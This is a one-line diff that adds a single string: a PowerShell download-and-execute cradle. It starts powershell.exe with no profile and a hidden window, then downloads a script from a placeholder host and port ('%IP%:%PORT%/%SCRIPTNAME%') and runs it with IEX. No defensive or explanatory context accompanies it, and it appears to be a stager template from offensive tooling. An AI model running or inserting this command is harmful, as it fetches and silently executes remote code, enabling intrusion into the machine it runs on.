@@ -1,0 +1,1 @@
+"C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.Webclient).Downloadstring('http://%IP%:%PORT%/%SCRIPTNAME%'))\""
